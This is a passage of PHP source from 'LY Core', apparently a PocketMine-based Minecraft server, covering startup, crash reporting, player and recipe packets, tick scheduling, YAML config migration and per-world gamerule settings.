			$this->logger->emergency("Crashed while crashing, killing process");
			@kill(getmypid());
		}

	}

	public function getQueryInformation(){
		return $this->queryRegenerateTask;
	}

	/**
	 * Starts the LY Core server and starts processing ticks and packets
	 */
	public function start(){
		if($this->getConfigBoolean("enable-query", true) === true){
			$this->queryHandler = new QueryHandler();
		}

		foreach($this->getIPBans()->getEntries() as $entry){
			$this->network->blockAddress($entry->getName(), -1);
		}

		if($this->getProperty("settings.send-usage", true)){
			$this->sendUsageTicker = 6000;
			$this->sendUsage(SendUsageTask::TYPE_OPEN);
		}


		if($this->getProperty("network.upnp-forwarding", false) == true){
			$this->logger->info("[UPnP] 尝试进行端口转发喵~");
			UPnP::PortForward($this->getPort());
		}

		$this->tickCounter = 0;

		if(function_exists("pcntl_signal")){
			pcntl_signal(SIGTERM, [$this, "handleSignal"]);
			pcntl_signal(SIGINT, [$this, "handleSignal"]);
			pcntl_signal(SIGHUP, [$this, "handleSignal"]);
			$this->dispatchSignals = true;
		}

		$this->logger->info($this->getLanguage()->translateString("pocketmine.server.defaultGameMode", [self::getGamemodeString($this->getGamemode())]));

		$this->logger->info($this->getLanguage()->translateString("pocketmine.server.startFinished", [round(microtime(true) - \lycore\START_TIME, 3)]));

		if(!file_exists($this->getPluginPath() . DIRECTORY_SEPARATOR . "LY Core")){
			@mkdir($this->getPluginPath() . DIRECTORY_SEPARATOR . "LY Core");
		}

		$this->tickProcessor();
		$this->forceShutdown();

		gc_collect_cycles();
	}

	public function handleSignal($signo){
		if($signo === SIGTERM or $signo === SIGINT or $signo === SIGHUP){
			$this->shutdown();
		}
	}

	public function exceptionHandler(\Throwable $e, $trace = null){
		if($e === null){
			return;
		}

		global $lastError;

		if($trace === null){
			$trace = $e->getTrace();
		}

		$errstr = $e->getMessage();
		$errfile = $e->getFile();
		$errno = $e->getCode();
		$errline = $e->getLine();

		$type = ($errno === E_ERROR or $errno === E_USER_ERROR) ? \LogLevel::ERROR : (($errno === E_USER_WARNING or $errno === E_WARNING) ? \LogLevel::WARNING : \LogLevel::NOTICE);
		if(($pos = strpos($errstr, "\n")) !== false){
			$errstr = substr($errstr, 0, $pos);
		}

		$errfile = cleanPath($errfile);

		if($this->logger instanceof MainLogger){
			$this->logger->logException($e, $trace);
		}

		$lastError = [
			"type" => $type,
			"message" => $errstr,
			"fullFile" => $e->getFile(),
			"file" => $errfile,
			"line" => $errline,
			"trace" => @getTrace(1, $trace)
		];

		global $lastExceptionError, $lastError;
		$lastExceptionError = $lastError;
		$this->crashDump();
	}

	public function crashDump(){
		if($this->isRunning === false){
			return;
		}
		if($this->sendUsageTicker > 0){
			$this->sendUsage(SendUsageTask::TYPE_CLOSE);
		}
		$this->hasStopped = false;

		ini_set("error_reporting", 0);
		ini_set("memory_limit", -1); //Fix error dump not dumped on memory problems
		$this->logger->emergency($this->getLanguage()->translateString("pocketmine.crash.create"));
		try{
			$dump = new CrashDump($this);
		}catch(\Throwable $e){
			$this->logger->critical($this->getLanguage()->translateString("pocketmine.crash.error", $e->getMessage()));
			return;
		}

		$php8FatalRecovered = Php8FatalRecovery::recoverBeforeCrashReport($this, $dump);
		if(!$php8FatalRecovered){
			$this->logger->emergency($this->getLanguage()->translateString("pocketmine.crash.submit", [$dump->getPath()]));
		}


		if(!$php8FatalRecovered and $this->getProperty("auto-report.enabled", true) !== false){
			$report = true;
			$plugin = $dump->getData()["plugin"];
			if(is_string($plugin)){
				$p = $this->pluginManager->getPlugin($plugin);
				if($p instanceof Plugin and !($p->getPluginLoader() instanceof PharPluginLoader)){
					$report = false;
				}
			}elseif(\Phar::running(true) == ""){
				$report = false;
			}
			if($dump->getData()["error"]["type"] === "E_PARSE" or $dump->getData()["error"]["type"] === "E_COMPILE_ERROR"){
				$report = false;
			}

			if($report){
				$reply = Utils::postURL("http://" . $this->getProperty("auto-report.host", "crash.pocketmine.net") . "/submit/api", [
					"report" => "yes",
					"name" => $this->getName() . " " . $this->getPocketMineVersion(),
					"email" => "crash@pocketmine.net",
					"reportPaste" => base64_encode($dump->getEncodedData())
				]);

				if(($data = json_decode($reply)) !== false and isset($data->crashId)){
					$reportId = $data->crashId;
					$reportUrl = $data->crashUrl;
					$this->logger->emergency($this->getLanguage()->translateString("pocketmine.crash.archive", [$reportUrl, $reportId]));
				}
			}
		}

		//$this->checkMemory();
		//$dump .= "Memory Usage Tracking: \r\n" . chunk_split(base64_encode(gzdeflate(implode(";", $this->memoryStats), 9))) . "\r\n";

		$this->forceShutdown();
		$this->isRunning = false;
		@kill(getmypid());
		exit(1);
	}

	public function __debugInfo(){
		return [];
	}

	private function tickProcessor(){
		$this->nextTick = microtime(true);
		while($this->isRunning){
			$this->tick();
			$next = $this->nextTick - 0.0001;
			if($next > microtime(true)){
				$this->sleepUntil($next);
			}
		}
	}

	private function sleepUntil($timestamp){
		$delay = $timestamp - microtime(true);
		if($delay > 0){
			usleep((int) max(1, $delay * 1000000));
		}
	}

	public function onPlayerLogin(Player $player){
		if($this->sendUsageTicker > 0){
			$this->uniquePlayers[$player->getRawUniqueId()] = $player->getRawUniqueId();
		}

		$this->sendFullPlayerListData($player);
		$this->sendRecipeList($player);
	}

	public function addPlayer($identifier, Player $player){
		$this->players[$identifier] = $player;
		$this->identifiers[spl_object_hash($player)] = $identifier;
	}

	public function addOnlinePlayer(Player $player){
		$this->playerList[$player->getRawUniqueId()] = $player;

		$this->updatePlayerListData($player->getUniqueId(), $player->getId(), $player->getDisplayName(), $player->getSkinName(), $player->getSkinData());
	}

	public function removeOnlinePlayer(Player $player){
		if(isset($this->playerList[$player->getRawUniqueId()])){
			unset($this->playerList[$player->getRawUniqueId()]);

			$pk = new PlayerListPacket();
			$pk->type = PlayerListPacket::TYPE_REMOVE;
			$pk->entries[] = [$player->getUniqueId()];
			Server::broadcastPacket($this->playerList, $pk);
		}
	}

	public function updatePlayerListData(UUID $uuid, $entityId, $name, $skinName, $skinData, array $players = null){
		$pk = new PlayerListPacket();
		$pk->type = PlayerListPacket::TYPE_ADD;
		$pk->entries[] = [$uuid, $entityId, $name, $skinName, $skinData];
		Server::broadcastPacket($players === null ? $this->playerList : $players, $pk);
	}

	public function removePlayerListData(UUID $uuid, array $players = null){
		$pk = new PlayerListPacket();
		$pk->type = PlayerListPacket::TYPE_REMOVE;
		$pk->entries[] = [$uuid];
		Server::broadcastPacket($players === null ? $this->playerList : $players, $pk);
	}

	public function sendFullPlayerListData(Player $p){
		$pk = new PlayerListPacket();
		$pk->type = PlayerListPacket::TYPE_ADD;
		foreach($this->playerList as $player){
			$pk->entries[] = [$player->getUniqueId(), $player->getId(), $player->getDisplayName(), $player->getSkinName(), $player->getSkinData()];
		}

		$p->dataPacket($pk);
	}

	private function getRecipeItemSignature(Item $item) : string{
		$meta = $item->getDamage();
		return $item->getId() . ":" . ($meta === null ? 0 : (int) $meta) . ":" . $item->getCount();
	}

	private function getCraftingRecipeSignature($recipe){
		if($recipe instanceof ShapedRecipe){
			$parts = ["shaped", (string) $recipe->getWidth(), (string) $recipe->getHeight(), $this->getRecipeItemSignature($recipe->getResult())];
			for($y = 0; $y < $recipe->getHeight(); ++$y){
				for($x = 0; $x < $recipe->getWidth(); ++$x){
					$parts[] = $this->getRecipeItemSignature($recipe->getIngredient($x, $y));
				}
			}
			return implode("|", $parts);
		}

		if($recipe instanceof ShapelessRecipe){
			$ingredients = [];
			foreach($recipe->getIngredientList() as $ingredient){
				$ingredients[] = $this->getRecipeItemSignature($ingredient);
			}
			sort($ingredients, SORT_STRING);
			return "shapeless|" . $this->getRecipeItemSignature($recipe->getResult()) . "|" . implode("|", $ingredients);
		}

		if($recipe instanceof FurnaceRecipe){
			return "furnace|" . $this->getRecipeItemSignature($recipe->getInput()) . "|" . $this->getRecipeItemSignature($recipe->getResult());
		}

		return null;
	}

	private function addRecipeToPacket(CraftingDataPacket $pk, $recipe){
		if($recipe instanceof ShapedRecipe){
			$pk->addShapedRecipe($recipe);
		}elseif($recipe instanceof ShapelessRecipe){
			$pk->addShapelessRecipe($recipe);
		}elseif($recipe instanceof FurnaceRecipe){
			$pk->addFurnaceRecipe($recipe);
		}
	}

	private function addRecipeToProtocolPacket(CraftingDataPacket $pk, int $protocol, $recipe, array &$seenRecipes){
		if(ProtocolCompatibility::isProtocol012($protocol)){
			$recipe = ProtocolCompatibility::mapCraftingRecipeForProtocol($protocol, $recipe);
			if($recipe === null){
				return;
			}

			$signature = $this->getCraftingRecipeSignature($recipe);
			if($signature !== null){
				if(isset($seenRecipes[$signature])){
					return;
				}
				$seenRecipes[$signature] = true;
			}
		}

		$this->addRecipeToPacket($pk, $recipe);
	}

	private function buildRecipeList(int $protocol) : CraftingDataPacket{
		$pk = new CraftingDataPacket();
		$pk->cleanRecipes = true;
		$seenRecipes = [];

		foreach($this->getCraftingManager()->getRecipesForProtocol($protocol) as $recipe){
			$this->addRecipeToProtocolPacket($pk, $protocol, $recipe, $seenRecipes);
		}

		foreach($this->getCraftingManager()->getFurnaceRecipes() as $recipe){
			$this->addRecipeToProtocolPacket($pk, $protocol, $recipe, $seenRecipes);
		}

		return $pk;
	}

	public function generateRecipeList(){
		$this->recipeLists = [
			"012" => $this->buildRecipeList(34),
			"013" => $this->buildRecipeList(37),
			"014" => $this->buildRecipeList(70),
			"015" => $this->buildRecipeList(84),
		];
	}

	public function sendRecipeList(Player $p){
		$protocol = (int) $p->getProtocol();
		if(ProtocolCompatibility::isProtocol012($protocol)){
			$key = "012";
		}elseif(ProtocolCompatibility::isProtocol013($protocol)){
			$key = "013";
		}elseif(ProtocolCompatibility::isProtocol015($protocol)){
			$key = "015";
		}else{
			$key = "014";
		}

		$p->dataPacket($this->recipeLists[$key]);
	}
	
	public function Oplist(){
		$olist = array_fill(0, 50, '');
		$i = 0;
		foreach(array_keys($this->getOps()->getAll()) as $ops)	{			
			$p = $this->getPlayer($ops);
			$olist[$i] = "§e- $ops ";
			$i ++;
		}
		return $olist;
	}

	private function checkTickUpdates($currentTick, $tickTime){
		foreach($this->players as $p){
			if(!$p->loggedIn and ($tickTime - $p->creationTime) >= 10){
				$p->close("", "登入超时！");
			}elseif($this->alwaysTickPlayers){
				$p->onUpdate($currentTick);
			}
		}

		//Do level ticks
		foreach($this->getLevels() as $level){
			if($level->getTickRate() > $this->baseTickRate and --$level->tickRateCounter > 0){
				continue;
			}
			try{
				$levelTime = microtime(true);
				$level->doTick($currentTick);
				$tickMs = (microtime(true) - $levelTime) * 1000;
				$level->tickRateTime = $tickMs;

				if($this->autoTickRate){
					if($tickMs < 50 and $level->getTickRate() > $this->baseTickRate){
						$level->setTickRate($r = $level->getTickRate() - 1);
						if($r > $this->baseTickRate){
							$level->tickRateCounter = $level->getTickRate();
						}
						$this->getLogger()->debug("Raising level \"" . $level->getName() . "\" tick rate to " . $level->getTickRate() . " ticks");
					}elseif($tickMs >= 50){
						if($level->getTickRate() === $this->baseTickRate){
							$level->setTickRate(max($this->baseTickRate + 1, min($this->autoTickRateLimit, floor($tickMs / 50))));
							$this->getLogger()->debug("Level \"" . $level->getName() . "\" took " . round($tickMs, 2) . "ms, setting tick rate to " . $level->getTickRate() . " ticks");
						}elseif(($tickMs / $level->getTickRate()) >= 50 and $level->getTickRate() < $this->autoTickRateLimit){
							$level->setTickRate($level->getTickRate() + 1);
							$this->getLogger()->debug("Level \"" . $level->getName() . "\" took " . round($tickMs, 2) . "ms, setting tick rate to " . $level->getTickRate() . " ticks");
						}
						$level->tickRateCounter = $level->getTickRate();
					}
				}
			}catch(\Throwable $e){
				$this->logger->critical($this->getLanguage()->translateString("pocketmine.level.tickError", [$level->getName(), $e->getMessage()]));
				if(\lycore\DEBUG > 1 and $this->logger instanceof MainLogger){
					$this->logger->logException($e);
				}
			}
		}
	}

	public function doAutoSave(){
		if($this->getAutoSave()){
			Timings::$worldSaveTimer->startTiming();
			foreach($this->players as $index => $player){
				if($player->isOnline()){
					$player->save(true);
				}elseif(!$player->isConnected()){
					$this->removePlayer($player);
				}
			}

			foreach($this->getLevels() as $level){
				$level->save(false);
			}
			Timings::$worldSaveTimer->stopTiming();
		}
	}

	public function sendUsage($type = SendUsageTask::TYPE_STATUS){
		$this->scheduler->scheduleAsyncTask(new SendUsageTask($this, $type, $this->uniquePlayers));
		$this->uniquePlayers = [];
	}


	/**
	 * @return BaseLang
	 */
	public function getLanguage(){
		return $this->baseLang;
	}

	/**
	 * @return bool
	 */
	public function isLanguageForced(){
		return $this->forceLanguage;
	}

	/**
	 * @return Network
	 */
	public function getNetwork(){
		return $this->network;
	}

	/**
	 * @return MemoryManager
	 */
	public function getMemoryManager(){
		return $this->memoryManager;
	}

	private function titleTick(){
		$this->network->resetStatistics();
	}

	/**
	 * @param string $address
	 * @param int    $port
	 * @param string $payload
	 *
	 * TODO: move this to Network
	 */
	/*public function handlePacket($address, $port, $payload){
		try{
			if(strlen($payload) > 2 and substr($payload, 0, 2) === "\xfe\xfd" and $this->queryHandler instanceof QueryHandler){
				$this->queryHandler->handle($address, $port, $payload);
			}
		}catch(\Throwable $e){
			if(\lycore\DEBUG > 1){
				if($this->logger instanceof MainLogger){
					$this->logger->logException($e);
				}
			}

			$this->getNetwork()->blockAddress($address, 600);
		}
		//TODO: add raw packet events
	}*/
	public function handlePacket($address, $port, $payload){
		try{
			if(strlen($payload) > 2 and substr($payload, 0, 2) === "\xfe\xfd"){
				if($this->queryHandler instanceof QueryHandler){ //DDOS防御判断效率需要
					$this->queryHandler->handle($address, $port, $payload);
				}
			}else{
				$this->getNetwork()->blockAddress($address, 60);
			}
		}catch(\Throwable $e){
			if(\lycore\DEBUG > 1){
				if($this->logger instanceof MainLogger){
					$this->logger->logException($e);
				}
			}

			$this->getNetwork()->blockAddress($address, 600);
		}
		//TODO: add raw packet events
	}
	
	public function checkDos(){
		$cleaned = round($this->network->getCleaned() / 1024, 2); //kB/s
		if($cleaned >= 100){
			if($cleaned >= 1000){
				$text = round($cleaned / 1024, 2)." MB/s";
			}else{
				$text = $cleaned." kB/s";
			}
			$this->getLogger()->warning("服务器疑似被攻击，目前流量".$text);
		}
	}

	public function syncPocketMineConfigLanguageTemplate(bool $showNotice = true) : bool{
		return $this->migratePocketMineConfigTemplate(null, $showNotice);
	}

	private function migratePocketMineConfigTemplate($targetLang = null, bool $showNotice = true) : bool{
		$configPath = $this->dataPath . "server.yml";
		if(!is_file($configPath)){
			return false;
		}

		$currentConfig = new Config($configPath, Config::YAML, []);
		if(!$currentConfig->check()){
			return false;
		}

		$currentData = $currentConfig->getAll();
		if($targetLang === null){
			$targetLang = isset($currentData["settings"]["language"]) ? $currentData["settings"]["language"] : BaseLang::FALLBACK_LANGUAGE;
		}
		$targetLang = $this->normalizePocketMineConfigTemplateLanguage($targetLang);
		if(isset($currentData["settings"]) and is_array($currentData["settings"])){
			$currentData["settings"]["language"] = $targetLang;
		}else{
			$currentData["settings"] = ["language" => $targetLang];
		}

		$templatePath = $this->getPocketMineConfigTemplatePath($targetLang);
		if(!is_file($templatePath)){
			return false;
		}

		$templateContent = file_get_contents($templatePath);
		if(!is_string($templateContent)){
			return false;
		}

		$templateConfig = new Config($templatePath, Config::YAML, []);
		if(!$templateConfig->check()){
			return false;
		}

		$mergedData = $this->mergeAdvancedConfigData($templateConfig->getAll(), $currentData);
		$newContent = $this->writeAdvancedConfigDataPreservingComments($templateContent, $mergedData);
		$oldContent = file_get_contents($configPath);
		if($oldContent === $newContent){
			return false;
		}

		file_put_contents($configPath, $newContent);
		$this->config = new Config($configPath, Config::YAML, []);
		$this->propertyCache = [];

		if($showNotice){
			$this->logger->notice($targetLang === "chs" ? "已自动将您的配置文件 server.yml 更换成中文" : "your server config \"server.yml\" has been translated into english.");
		}

		return true;
	}

	private function normalizePocketMineConfigTemplateLanguage($lang) : string{
		return strtolower((string) $lang) === "chs" ? "chs" : "eng";
	}

	private function getPocketMineConfigTemplatePath($lang) : string{
		$lang = $this->normalizePocketMineConfigTemplateLanguage($lang);
		return $this->filePath . "src/lycore/resources/pocketmine_" . $lang . ".yml";
	}

	private function migrateAdvancedConfigTemplate(string $advancedConfigPath, string $templatePath, bool $showNotice = true) : bool{
		if(!is_file($advancedConfigPath) or !is_file($templatePath)){
			return false;
		}

		$currentConfig = new Config($advancedConfigPath, Config::YAML, []);
		$templateConfig = new Config($templatePath, Config::YAML, []);
		if(!$currentConfig->check() or !$templateConfig->check()){
			return false;
		}

		$currentData = $currentConfig->getAll();
		$templateData = $templateConfig->getAll();
		$currentVersion = isset($currentData["config"]["version"]) ? (int) $currentData["config"]["version"] : 0;
		$templateVersion = isset($templateData["config"]["version"]) ? (int) $templateData["config"]["version"] : 0;
		if($templateVersion <= 0 or $currentVersion >= $templateVersion){
			return false;
		}

		if(isset($currentData["config"]) and is_array($currentData["config"])){
			unset($currentData["config"]["version"]);
		}

		$mergedData = $this->mergeAdvancedConfigData($templateData, $currentData);
		$templateContent = file_get_contents($templatePath);
		if(!is_string($templateContent)){
			return false;
		}

		$newContent = $this->writeAdvancedConfigDataPreservingComments($templateContent, $mergedData);
		$oldContent = file_get_contents($advancedConfigPath);
		if($oldContent === $newContent){
			return false;
		}

		file_put_contents($advancedConfigPath, $newContent);
		if($showNotice and $this->logger instanceof \ThreadedLogger){
			$this->logger->notice("lycore.yml已升级完成喵，自定义设置都保留好啦");
		}

		return true;
	}

	private function migrateLegacyAdvancedConfig(string $advancedConfigPath, string $legacyConfigPath, string $legacyBackupConfigPath = null) : bool{
		if(!is_file($legacyConfigPath)){
			return false;
		}

		if($legacyBackupConfigPath === null){
			$legacyBackupConfigPath = $legacyConfigPath . ".bak";
		}

		$advancedConfig = new Config($advancedConfigPath, Config::YAML, []);
		$legacyConfig = new Config($legacyConfigPath, Config::YAML, []);
		if(!$advancedConfig->check() or !$legacyConfig->check()){
			return false;
		}

		$legacyData = $legacyConfig->getAll();
		if(isset($legacyData["config"]) and is_array($legacyData["config"])){
			unset($legacyData["config"]["version"]);
		}

		$mergedData = $this->mergeAdvancedConfigData($advancedConfig->getAll(), $legacyData);
		$content = file_get_contents($advancedConfigPath);
		if(is_string($content)){
			file_put_contents($advancedConfigPath, $this->writeAdvancedConfigDataPreservingComments($content, $mergedData));
		}else{
			$advancedConfig->setAll($mergedData);
			$advancedConfig->save(false);
		}

		if(is_file($legacyBackupConfigPath)){
			@rename($legacyBackupConfigPath, $legacyBackupConfigPath . "." . date("YmdHis"));
		}

		return @rename($legacyConfigPath, $legacyBackupConfigPath);
	}

	private function mergeAdvancedConfigData(array $base, array $legacy) : array{
		foreach($legacy as $key => $value){
			if(is_array($value) and isset($base[$key]) and is_array($base[$key])){
				$base[$key] = $this->mergeAdvancedConfigData($base[$key], $value);
			}else{
				$base[$key] = $value;
			}
		}

		return $base;
	}

	private function writeAdvancedConfigDataPreservingComments(string $content, array $data) : string{
		$lineEnding = strpos($content, "\r\n") !== false ? "\r\n" : "\n";
		$hasTrailingNewline = preg_match('/(\r\n|\n|\r)$/', $content) === 1;
		$lines = preg_split('/\r\n|\n|\r/', $content);
		if($hasTrailingNewline and end($lines) === ""){
			array_pop($lines);
		}

		$output = [];
		$pathStack = [];
		$seenPaths = [];
		$count = count($lines);
		for($i = 0; $i < $count; ++$i){
			$line = $lines[$i];
			if(preg_match('/^(\s*)([A-Za-z0-9_-]+)\s*:\s*(.*)$/', $line, $matches) !== 1){
				$output[] = $line;
				continue;
			}

			$indent = strlen($matches[1]);
			while(count($pathStack) > 0 and $pathStack[count($pathStack) - 1]["indent"] >= $indent){
				$entry = array_pop($pathStack);
				$this->appendMissingAdvancedConfigYamlChildren($output, $data, $entry["path"], $entry["indent"] + 1, $seenPaths);
			}

			$key = $matches[2];
			$path = [];
			foreach($pathStack as $entry){
				$path[] = $entry["key"];
			}
			$parentPath = $path;
			$path[] = $key;
			$seenPaths[$this->getAdvancedConfigPathKey($parentPath)][$key] = true;

			$found = false;
			$value = $this->getAdvancedConfigDataPath($data, $path, $found);
			$inlineValue = trim($matches[3]);
			if($found and (!is_array($value) or $inlineValue !== "")){
				foreach($this->emitAdvancedConfigYamlEntry($matches[1], $key, $value) as $emittedLine){
					$output[] = $emittedLine;
				}
				if(is_array($value)){
					$this->skipAdvancedConfigYamlChildren($lines, $i, $indent);
				}
				continue;
			}

			$output[] = $line;
			if($inlineValue === ""){
				$pathStack[] = [
					"indent" => $indent,
					"key" => $key,
					"path" => $path,
				];
			}
		}
		while(count($pathStack) > 0){
			$entry = array_pop($pathStack);
			$this->appendMissingAdvancedConfigYamlChildren($output, $data, $entry["path"], $entry["indent"] + 1, $seenPaths);
		}
		$this->appendMissingAdvancedConfigYamlChildren($output, $data, [], 0, $seenPaths);

		return implode($lineEnding, $output) . ($hasTrailingNewline ? $lineEnding : "");
	}

	private function appendMissingAdvancedConfigYamlChildren(array &$output, array $data, array $path, int $childIndent, array &$seenPaths) : void{
		$found = false;
		$value = $this->getAdvancedConfigDataPath($data, $path, $found);
		if(!$found or !is_array($value) or $this->isAdvancedConfigList($value)){
			return;
		}

		$pathKey = $this->getAdvancedConfigPathKey($path);
		$seen = isset($seenPaths[$pathKey]) ? $seenPaths[$pathKey] : [];
		foreach($value as $key => $childValue){
			if(isset($seen[$key])){
				continue;
			}
			foreach($this->emitAdvancedConfigYamlEntry(str_repeat(" ", $childIndent), (string) $key, $childValue) as $childLine){
				$output[] = $childLine;
			}
			$seenPaths[$pathKey][$key] = true;
		}
	}

	private function getAdvancedConfigPathKey(array $path) : string{
		return implode("\0", $path);
	}

	private function getAdvancedConfigDataPath(array $data, array $path, bool &$found){
		$current = $data;
		foreach($path as $key){
			if(!is_array($current) or !array_key_exists($key, $current)){
				$found = false;
				return null;
			}
			$current = $current[$key];
		}

		$found = true;
		return $current;
	}

	private function skipAdvancedConfigYamlChildren(array $lines, int &$index, int $indent) : void{
		$count = count($lines);
		while($index + 1 < $count){
			$nextLine = $lines[$index + 1];
			if(trim($nextLine) === ""){
				break;
			}
			$nextIndent = strlen($nextLine) - strlen(ltrim($nextLine, " \t"));
			if($nextIndent <= $indent){
				break;
			}
			++$index;
		}
	}

	private function emitAdvancedConfigYamlEntry(string $indent, string $key, $value) : array{
		if(!is_array($value)){
			return [$indent . $key . ": " . $this->formatAdvancedConfigYamlScalar($value)];
		}

		if(count($value) === 0){
			return [$indent . $key . ": []"];
		}

		$lines = [$indent . $key . ":"];
		$childIndent = $indent . " ";
		if($this->isAdvancedConfigList($value)){
			foreach($value as $entry){
				if(is_array($entry)){
					$lines[] = $childIndent . "-";
					foreach($entry as $childKey => $childValue){
						foreach($this->emitAdvancedConfigYamlEntry($childIndent . " ", (string) $childKey, $childValue) as $childLine){
							$lines[] = $childLine;
						}
					}
				}else{
					$lines[] = $childIndent . "- " . $this->formatAdvancedConfigYamlScalar($entry);
				}
			}
			return $lines;
		}

		foreach($value as $childKey => $childValue){
			foreach($this->emitAdvancedConfigYamlEntry($childIndent, (string) $childKey, $childValue) as $childLine){
				$lines[] = $childLine;
			}
		}

		return $lines;
	}

	private function isAdvancedConfigList(array $value) : bool{
		return array_keys($value) === range(0, count($value) - 1);
	}

	private function formatAdvancedConfigYamlScalar($value) : string{
		if(is_bool($value)){
			return $value ? "true" : "false";
		}
		if(is_int($value) or is_float($value)){
			return (string) $value;
		}
		if($value === null){
			return "null";
		}

		$value = (string) $value;
		if($value !== "" and preg_match('/^[A-Za-z0-9_.\/-]+$/', $value) === 1 and !is_numeric($value) and !in_array(strtolower($value), ["true", "false", "null", "yes", "no", "on", "off"], true)){
			return $value;
		}

		return json_encode($value, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
	}

	/**
	 * @param             $variable
	 * @param null        $defaultValue
	 * @param Config|null $cfg
	 * @return bool|mixed|null
	 */
	public function getAdvancedProperty($variable, $defaultValue = null, Config $cfg = null){
		$vars = explode(".", $variable);
		$base = array_shift($vars);
		if($cfg == null) $cfg = $this->advancedConfig;
		if($cfg->exists($base)){
			$base = $cfg->get($base);
		}else{
			return $defaultValue;
		}

		while(count($vars) > 0){
			$baseKey = array_shift($vars);
			if(is_array($base) and isset($base[$baseKey])){
				$base = $base[$baseKey];
			}else{
				return $defaultValue;
			}
		}

		return $base;
	}

	public function isBotEnabled() : bool{
		return (bool) $this->getAdvancedProperty("bot.enable", true);
	}

	private function initializeBotStorage(){
		if($this->isBotEnabled()){
			new \lycore\entity\BotTypeManager($this->dataPath);
		}
	}

	public function getSupportedGamerules() : array{
		return [
			"doMobSpawning" => [
				"type" => "bool",
				"behavior" => "no-natural-mob-spawn",
				"default" => true,
				"listedValue" => false,
			],
			"doMobLoot" => [
				"type" => "bool",
				"behavior" => "no-mob-death-drops-and-experience",
				"default" => true,
				"listedValue" => false,
			],
			"mobGriefing" => [
				"type" => "bool",
				"behavior" => "no-creeper-block-damage",
				"default" => true,
				"listedValue" => false,
			],
			"tnTExplodes" => [
				"type" => "bool",
				"behavior" => "no-tnt-block-damage",
				"default" => true,
				"listedValue" => false,
			],
			"naturalRegeneration" => [
				"type" => "bool",
				"behavior" => "no-hunger-health-regeneration",
				"default" => true,
				"listedValue" => false,
			],
			"randomTickSpeed" => [
				"type" => "int",
				"behavior" => "no-crop-growth",
				"default" => 1,
				"listedValue" => 0,
			],
			"doEntityDrops" => [
				"type" => "bool",
				"behavior" => "no-non-living-entity-drops",
				"default" => true,
				"listedValue" => false,
			],
			"keepInventory" => [
				"type" => "bool",
				"behavior" => "keep-inventory",
				"default" => $this->keepInventory,
				"listedValue" => true,
			],
			"doDaylightCycle" => [
				"type" => "bool",
				"behavior" => "do-daylight-cycle",
				"default" => true,
				"listedValue" => false,
			],
		];
	}

	public function getWorldGamerule($level, string $rule){
		$rules = $this->getSupportedGamerules();
		if(!isset($rules[$rule])){
			return null;
		}

		$override = $this->getWorldGameruleOverride($level, $rule);
		if($override !== null){
			return $this->normalizeGameruleValue($rules[$rule], $override);
		}

		$definition = $rules[$rule];
		if($this->isWorldBehaviorDisabled($level, $definition["behavior"])){
			return $definition["listedValue"];
		}

		return $definition["default"];
	}

	public function setWorldGamerule($level, string $rule, $value) : bool{
		$rules = $this->getSupportedGamerules();
		if(!isset($rules[$rule])){
			return false;
		}

		$definition = $rules[$rule];
		$value = $this->normalizeGameruleValue($definition, $value);
		$this->persistWorldGameruleValue($level, $rule, $value);
		$this->persistWorldGamerule($level, $definition["behavior"], $value === $this->normalizeGameruleValue($definition, $definition["listedValue"]));
		if($rule === "doDaylightCycle" and $level instanceof Level){
			$level->sendTime();
		}
		return true;
	}

	private function getWorldGameruleOverride($level, string $rule){
		if(!($this->advancedConfig instanceof Config)){
			return null;
		}

		$world = $this->getWorldConfigName($level);
		if($world === ""){
			return null;
		}

		$worldConfig = $this->advancedConfig->get("world", []);
		if(!is_array($worldConfig) or !isset($worldConfig["gamerules"]) or !is_array($worldConfig["gamerules"])){
			return null;
		}

		if(isset($worldConfig["gamerules"][$world]) and is_array($worldConfig["gamerules"][$world]) and array_key_exists($rule, $worldConfig["gamerules"][$world])){
			return $worldConfig["gamerules"][$world][$rule];
		}

		return null;
	}

	private function persistWorldGameruleValue($level, string $rule, $value) : void{
		if(!($this->advancedConfig instanceof Config)){
			return;
		}

		$world = $this->getWorldConfigName($level);
		if($world === ""){
			return;
		}

		$worldConfig = $this->advancedConfig->get("world", []);
		if(!is_array($worldConfig)){
			$worldConfig = [];
		}
		if(!isset($worldConfig["gamerules"]) or !is_array($worldConfig["gamerules"])){
			$worldConfig["gamerules"] = [];
		}
		if(!isset($worldConfig["gamerules"][$world]) or !is_array($worldConfig["gamerules"][$world])){
			$worldConfig["gamerules"][$world] = [];
		}

		$worldConfig["gamerules"][$world][$rule] = $value;
		$this->advancedConfig->set("world", $worldConfig);
	}

	private function normalizeGameruleValue(array $definition, $value){
		if($definition["type"] === "int"){
			return max(0, (int) $value);
		}

		if(is_string($value)){
			$value = strtolower(trim($value));
			if($value === "false" or $value === "0" or $value === "off" or $value === "no"){
				return false;
			}
			if($value === "true" or $value === "1" or $value === "on" or $value === "yes"){
				return true;
			}
		}

		return (bool) $value;
	}

	private function getWorldConfigName($level) : string{
		if($level instanceof Level){
			return trim((string) $level->getFolderName());
		}

		if(is_object($level) and method_exists($level, "getFolderName")){
			return trim((string) $level->getFolderName());
		}

		return trim((string) $level);
	}

	private function persistWorldGamerule($level, string $behavior, bool $listed) : void{
		$world = $this->getWorldConfigName($level);
		if($world === ""){
			return;
		}

		$current = isset($this->worldBehaviorConfig[$behavior]) ? $this->worldBehaviorConfig[$behavior] : $this->normalizeWorldNameList($this->getAdvancedProperty("world." . $behavior, []));
		$worlds = [];
		foreach($current as $entry){
			$entry = trim((string) $entry);
			if($entry !== ""){
				$worlds[$this->normalizeWorldName($entry)] = $entry;
			}
		}

		$normalized = $this->normalizeWorldName($world);
		if($listed){
			$worlds[$normalized] = $world;
		}else{
			unset($worlds[$normalized]);
		}

		$list = array_values($worlds);
		sort($list, SORT_NATURAL | SORT_FLAG_CASE);
		$this->worldBehaviorConfig[$behavior] = $this->normalizeWorldNameList($list);

		if($this->advancedConfig instanceof Config){
			$this->advancedConfig->setNested("world." . $behavior, $list);
			$this->saveAdvancedConfig();
		}
	}

	private function saveAdvancedConfig() : void{
		if($this->advancedConfig instanceof Config){
			$path = $this->dataPath . "lycore.yml";
			$content = file_get_contents($path);
			if(is_string($content)){
				file_put_contents($path, $this->writeAdvancedConfigDataPreservingComments($content, $this->advancedConfig->getAll()));
			}else{
				$this->advancedConfig->save(false);
			}
		}
	}

	private function normalizeWorldName($name) : string{
		return strtolower(trim((string) $name));
	}

	public function normalizeWorldNameList($value) : array{
		if(is_string($value)){
			$value = preg_split('/[,;]/', $value);
		}elseif(!is_array($value)){
			$value = [$value];
		}

